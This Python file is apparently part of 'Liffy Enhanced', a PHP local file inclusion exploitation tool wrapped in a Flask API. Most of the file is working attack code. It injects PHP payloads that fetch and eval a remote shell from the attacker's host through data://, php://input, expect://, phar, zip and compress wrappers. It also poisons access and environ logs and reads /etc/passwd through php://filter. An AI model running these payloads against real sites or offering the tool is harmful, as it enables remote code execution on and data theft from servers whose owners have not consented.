#!/usr/bin/env python3
"""
API Mode for Liffy Enhanced
Provides programmatic access to Liffy functionality
"""

import json
import asyncio
import aiohttp
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import logging
from pathlib import Path
import ip_utils

class APITechnique(Enum):
    """API technique enumeration"""
    DATA = "data"
    INPUT = "input"
    EXPECT = "expect"
    ENVIRON = "environ"
    ACCESS = "access"
    SSH = "ssh"
    FILTER = "filter"
    ZIP = "zip"
    PHAR = "phar"
    COMPRESS = "compress"
    AUTO = "auto"

@dataclass
class APIConfig:
    """API configuration"""
    target_url: str
    technique: APITechnique
    lhost: Optional[str] = None
    lport: Optional[int] = None
    auto_ip: bool = False
    auto_port: bool = False
    cookies: Optional[str] = None
    location: Optional[str] = None
    nostager: bool = False
    relative: bool = False
    timeout: int = 30
    user_agent: Optional[str] = None
    proxy: Optional[str] = None
    threads: int = 1
    file: Optional[str] = None

@dataclass
class APIResponse:
    """API response structure"""
    success: bool
    message: str
    data: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    technique: Optional[str] = None
    execution_time: Optional[float] = None

class LiffyAPI:
    """Liffy Enhanced API Client"""
    
    def __init__(self, config: APIConfig):
        self.config = config
        self.logger = logging.getLogger('liffy_api')
        self.session = None
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def execute_technique(self) -> APIResponse:
        """Execute the configured technique"""
        start_time = asyncio.get_event_loop().time()
        
        try:
            # Auto-detect lhost and lport if needed
            if self.config.auto_ip or not self.config.lhost:
                detected_lhost, _ = ip_utils.NetworkUtils.auto_detect_lhost_lport(self.config.target_url)
                if detected_lhost:
                    self.config.lhost = detected_lhost
            
            if self.config.auto_port or not self.config.lport:
                detected_port = ip_utils.PortManager.find_best_port()
                self.config.lport = detected_port
            
            if self.config.technique == APITechnique.AUTO:
                result = await self._execute_auto()
            elif self.config.technique == APITechnique.DATA:
                result = await self._execute_data()
            elif self.config.technique == APITechnique.INPUT:
                result = await self._execute_input()
            elif self.config.technique == APITechnique.EXPECT:
                result = await self._execute_expect()
            elif self.config.technique == APITechnique.ENVIRON:
                result = await self._execute_environ()
            elif self.config.technique == APITechnique.ACCESS:
                result = await self._execute_access()
            elif self.config.technique == APITechnique.SSH:
                result = await self._execute_ssh()
            elif self.config.technique == APITechnique.FILTER:
                result = await self._execute_filter()
            elif self.config.technique == APITechnique.ZIP:
                result = await self._execute_zip()
            elif self.config.technique == APITechnique.PHAR:
                result = await self._execute_phar()
            elif self.config.technique == APITechnique.COMPRESS:
                result = await self._execute_compress()
            else:
                raise ValueError(f"Unsupported technique: {self.config.technique}")
            
            execution_time = asyncio.get_event_loop().time() - start_time
            
            return APIResponse(
                success=True,
                message=f"Technique {self.config.technique.value} executed successfully",
                data=result,
                technique=self.config.technique.value,
                execution_time=execution_time
            )
            
        except Exception as e:
            execution_time = asyncio.get_event_loop().time() - start_time
            self.logger.error(f"Error executing technique: {str(e)}")
            
            return APIResponse(
                success=False,
                message=f"Failed to execute technique {self.config.technique.value}",
                error=str(e),
                technique=self.config.technique.value,
                execution_time=execution_time
            )
    
    async def _execute_auto(self) -> Dict[str, Any]:
        """Execute automatic technique detection"""
        techniques = [
            APITechnique.DATA,
            APITechnique.INPUT,
            APITechnique.EXPECT,
            APITechnique.FILTER,
            APITechnique.ZIP,
            APITechnique.PHAR,
            APITechnique.COMPRESS
        ]
        
        working_techniques = []
        
        for technique in techniques:
            try:
                # Temporarily change technique
                original_technique = self.config.technique
                self.config.technique = technique
                
                # Test technique
                if await self._test_technique(technique):
                    working_techniques.append(technique.value)
                
                # Restore original technique
                self.config.technique = original_technique
                
            except Exception as e:
                self.logger.warning(f"Technique {technique.value} failed: {str(e)}")
                continue
        
        if working_techniques:
            # Use first working technique
            self.config.technique = APITechnique(working_techniques[0])
            return await self._execute_technique_by_name(working_techniques[0])
        else:
            raise Exception("No working techniques found")
    
    async def _test_technique(self, technique: APITechnique) -> bool:
        """Test if a technique works"""
        try:
            if technique == APITechnique.DATA:
                test_payload = "data://text/plain,<?php echo 'LFI_TEST_SUCCESS'; ?>"
            elif technique == APITechnique.INPUT:
                test_payload = "php://input"
                test_data = "<?php echo 'LFI_TEST_SUCCESS'; ?>"
            elif technique == APITechnique.EXPECT:
                test_payload = "expect://echo 'LFI_TEST_SUCCESS'"
            elif technique == APITechnique.FILTER:
                test_payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
            else:
                return False
            
            url = self.config.target_url + test_payload
            
            if technique == APITechnique.INPUT:
                async with self.session.post(url, data=test_data) as response:
                    return "LFI_TEST_SUCCESS" in await response.text()
            else:
                async with self.session.get(url) as response:
                    return response.status == 200
                    
        except Exception:
            return False
    
    async def _execute_technique_by_name(self, technique_name: str) -> Dict[str, Any]:
        """Execute technique by name"""
        technique_map = {
            'data': self._execute_data,
            'input': self._execute_input,
            'expect': self._execute_expect,
            'environ': self._execute_environ,
            'access': self._execute_access,
            'ssh': self._execute_ssh,
            'filter': self._execute_filter,
            'zip': self._execute_zip,
            'phar': self._execute_phar,
            'compress': self._execute_compress
        }
        
        if technique_name in technique_map:
            return await technique_map[technique_name]()
        else:
            raise ValueError(f"Unknown technique: {technique_name}")
    
    async def _execute_data(self) -> Dict[str, Any]:
        """Execute data:// technique"""
        import base64
        from urllib.parse import quote_plus
        
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for data technique")
        
        # Generate payload
        payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
        encoded_payload = quote_plus(base64.b64encode(payload.encode()).decode())
        data_wrapper = f"data://text/html;base64,{encoded_payload}"
        
        url = self.config.target_url + data_wrapper
        
        async with self.session.get(url) as response:
            return {
                "url": url,
                "status_code": response.status,
                "response": await response.text()
            }
    
    async def _execute_input(self) -> Dict[str, Any]:
        """Execute php://input technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for input technique")
        
        payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
        url = self.config.target_url + "php://input"
        
        async with self.session.post(url, data=payload) as response:
            return {
                "url": url,
                "status_code": response.status,
                "response": await response.text()
            }
    
    async def _execute_expect(self) -> Dict[str, Any]:
        """Execute expect:// technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for expect technique")
        
        payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
        expect_payload = f'expect://echo "{payload}" | php'
        url = self.config.target_url + expect_payload
        
        async with self.session.get(url) as response:
            return {
                "url": url,
                "status_code": response.status,
                "response": await response.text()
            }
    
    async def _execute_environ(self) -> Dict[str, Any]:
        """Execute /proc/self/environ technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for environ technique")
        
        payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
        url = self.config.target_url + "/proc/self/environ"
        headers = {'User-Agent': payload}
        
        async with self.session.get(url, headers=headers) as response:
            return {
                "url": url,
                "status_code": response.status,
                "response": await response.text()
            }
    
    async def _execute_access(self) -> Dict[str, Any]:
        """Execute access log poisoning technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for access log technique")
        
        payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
        location = self.config.location or "/var/log/apache2/access.log"
        url = self.config.target_url + location
        headers = {'User-Agent': payload}
        
        async with self.session.get(url, headers=headers) as response:
            return {
                "url": url,
                "status_code": response.status,
                "response": await response.text()
            }
    
    async def _execute_ssh(self) -> Dict[str, Any]:
        """Execute SSH log poisoning technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for SSH log technique")
        
        # This would require SSH connection attempt
        # For API mode, we'll just return the technique info
        return {
            "technique": "ssh_log_poisoning",
            "message": "SSH log poisoning requires manual SSH connection",
            "payload": "<?php eval($_GET['code']); ?>"
        }
    
    async def _execute_filter(self) -> Dict[str, Any]:
        """Execute php://filter technique"""
        file_to_read = self.config.file or "/etc/passwd"
        payload = f"php://filter/convert.base64-encode/resource={file_to_read}"
        url = self.config.target_url + payload
        
        async with self.session.get(url) as response:
            response_text = await response.text()
            try:
                import base64
                decoded_content = base64.b64decode(response_text).decode('utf-8', errors='ignore')
                return {
                    "url": url,
                    "status_code": response.status,
                    "file": file_to_read,
                    "content": decoded_content,
                    "raw_response": response_text
                }
            except Exception as e:
                return {
                    "url": url,
                    "status_code": response.status,
                    "file": file_to_read,
                    "raw_response": response_text,
                    "decode_error": str(e)
                }
    
    async def _execute_zip(self) -> Dict[str, Any]:
        """Execute zip:// technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for zip technique")
        
        import zipfile
        import tempfile
        
        # Create temporary ZIP file
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp_file:
            with zipfile.ZipFile(tmp_file.name, 'w') as zip_file:
                payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
                zip_file.writestr("shell.php", payload)
            
            payload_url = f"zip://{tmp_file.name}#shell.php"
            url = self.config.target_url + payload_url
            
            async with self.session.get(url) as response:
                return {
                    "url": url,
                    "status_code": response.status,
                    "response": await response.text()
                }
    
    async def _execute_phar(self) -> Dict[str, Any]:
        """Execute phar:// technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for phar technique")
        
        import tempfile
        
        # Create temporary PHAR file
        with tempfile.NamedTemporaryFile(suffix='.phar', delete=False) as tmp_file:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
            tmp_file.write(payload.encode())
            tmp_file.flush()
            
            payload_url = f"phar://{tmp_file.name}"
            url = self.config.target_url + payload_url
            
            async with self.session.get(url) as response:
                return {
                    "url": url,
                    "status_code": response.status,
                    "response": await response.text()
                }
    
    async def _execute_compress(self) -> Dict[str, Any]:
        """Execute compress.zlib:// technique"""
        if not self.config.lhost or not self.config.lport:
            raise ValueError("LHOST and LPORT are required for compress technique")
        
        import zlib
        import tempfile
        
        # Create temporary compressed file
        with tempfile.NamedTemporaryFile(suffix='.gz', delete=False) as tmp_file:
            payload = f"<?php eval(file_get_contents('http://{self.config.lhost}:8000/shell.php')); ?>"
            compressed_data = zlib.compress(payload.encode())
            tmp_file.write(compressed_data)
            tmp_file.flush()
            
            payload_url = f"compress.zlib://{tmp_file.name}"
            url = self.config.target_url + payload_url
            
            async with self.session.get(url) as response:
                return {
                    "url": url,
                    "status_code": response.status,
                    "response": await response.text()
                }

# API Server
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/api/execute', methods=['POST'])
async def execute_technique():
    """Execute LFI technique via API"""
    try:
        data = request.get_json()
        
        # Validate required fields
        if not data.get('target_url'):
            return jsonify({'error': 'target_url is required'}), 400
        
        # Create config
        config = APIConfig(
            target_url=data['target_url'],
            technique=APITechnique(data.get('technique', 'auto')),
            lhost=data.get('lhost'),
            lport=data.get('lport'),
            cookies=data.get('cookies'),
            location=data.get('location'),
            nostager=data.get('nostager', False),
            relative=data.get('relative', False),
            timeout=data.get('timeout', 30),
            user_agent=data.get('user_agent'),
            proxy=data.get('proxy'),
            threads=data.get('threads', 1),
            file=data.get('file')
        )
        
        # Execute technique
        async with LiffyAPI(config) as api:
            result = await api.execute_technique()
        
        return jsonify(asdict(result))
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/techniques', methods=['GET'])
def get_techniques():
    """Get available techniques"""
    techniques = [technique.value for technique in APITechnique]
    return jsonify({'techniques': techniques})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'version': '2.0.0'})

@app.route('/api/network-info', methods=['GET'])
def get_network_info():
    """Get network information"""
    try:
        network_info = ip_utils.NetworkUtils.get_network_info()
        return jsonify(network_info)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/auto-detect', methods=['POST'])
def auto_detect():
    """Auto-detect lhost and lport"""
    try:
        data = request.get_json()
        target_url = data.get('target_url')
        
        lhost, lport = ip_utils.NetworkUtils.auto_detect_lhost_lport(target_url)
        
        return jsonify({
            'lhost': lhost,
            'lport': lport,
            'success': lhost is not None and lport is not None
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ports', methods=['GET'])
def get_ports():
    """Get port information"""
    try:
        suggested_ports = ip_utils.PortManager.get_suggested_ports()
        best_port = ip_utils.PortManager.find_best_port()
        
        port_info = []
        for port in suggested_ports:
            port_info.append({
                'port': port,
                'available': ip_utils.PortManager.is_port_available(port)
            })
        
        return jsonify({
            'suggested_ports': port_info,
            'best_port': best_port
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
